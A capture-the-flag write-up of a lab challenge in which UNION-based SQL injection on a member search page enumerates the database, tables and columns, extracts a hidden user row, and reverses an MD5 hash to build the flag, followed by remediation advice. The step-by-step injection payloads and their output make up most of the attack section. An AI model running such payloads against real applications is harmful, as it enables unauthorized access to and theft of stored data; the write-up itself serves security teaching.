# Breach: Full SQL Enumeration and Flag Reconstruction via Hash Reversal

## Discovery & Exploit

This challenge involved a multi-step SQL injection process starting with a simple condition:

You need to open the page `/?page=member` and submit the input:

``0=0``

This returned 4 users, one of whom had the names:

``First name: Flag``  
``Surname: GetThe``

We began enumeration using a classic UNION SELECT injection:

**Step 1 – Current Database Name**
``0=0 UNION SELECT database(), null--``  
→ Revealed: `Member_Sql_Injection`

**Step 2 – Table Enumeration**
``0=0 UNION SELECT table_name, null FROM information_schema.tables WHERE table_schema=CHAR(77,101,109,98,101,114,95,83,113,108,95,73,110,106,101,99,116,105,111,110)--``  
→ Found table: `users`

**Step 3 – Column Enumeration**
``0=0 UNION SELECT column_name, null FROM information_schema.columns WHERE table_name=CHAR(117,115,101,114,115) AND table_schema=CHAR(77,101,109,98,101,114,95,83,113,108,95,73,110,106,101,99,116,105,111,110)--``  
→ Columns found:  
`user_id`, `first_name`, `last_name`, `town`, `country`, `planet`, `Commentaire`, `countersign`

**Step 4 – Data Extraction**
We then queried the suspected user row with:

``0=0 UNION SELECT first_name, [column] FROM users--``

This gave us:

- `user_id = 5`
- `first_name = Flag`
- `last_name = GetThe`
- `Commentaire = Decrypt this password -> then lower all the char. Sh256 on it and it's good !`
- `countersign = 5ff9d0165b4f92b14994e5c685cdce28`

**Step 5 – Hash Decoding**

The `countersign` value was an MD5 hash. Using a [public hash lookup](https://md5.gromweb.com/?md5=5ff9d0165b4f92b14994e5c685cdce28) service:

→ `5ff9d0165b4f92b14994e5c685cdce28` = `FortyTwo`  
→ Lowercase: `fortytwo`  
→ [SHA256](https://10015.io/tools/sha256-encrypt-decrypt) of `fortytwo` = [flag](../flag)

**This is our final flag.**

## Vulnerability Details

This vulnerability demonstrates a full chain of **UNION-based SQL injection**, allowing the attacker to:

- Discover the database name
- Enumerate tables and columns
- Extract rows from sensitive tables
- Rebuild hidden secrets through hash decoding

Such attacks are possible when user input is directly injected into SQL statements without proper escaping or parameterization.

References:

- https://owasp.org/www-community/attacks/SQL_Injection
- https://portswigger.net/web-security/sql-injection/union-attacks
- https://md5.gromweb.com/

## Remediation

1. Always use parameterized queries or prepared statements.
2. Do not expose database errors in the frontend.
3. Apply the principle of least privilege on database accounts.
4. Sanitize and validate all user input.
5. Monitor for suspicious queries and implement rate limiting.

---

<table width="100%">
  <tr>
    <td align="left"><a href="../../Breach07_SpoofedHeaderAccessBypass/Ressources/writeup.md">← Previous: Breach08</a></td>
    <td align="center"><a href="../../README.md">↑ Back to README</a></td>
    <td align="right"><a href="../../Breach09_SQLi_UnionExtractFlag/Ressources/writeup.md">Next: Breach10 →</a></td>
  </tr>
</table>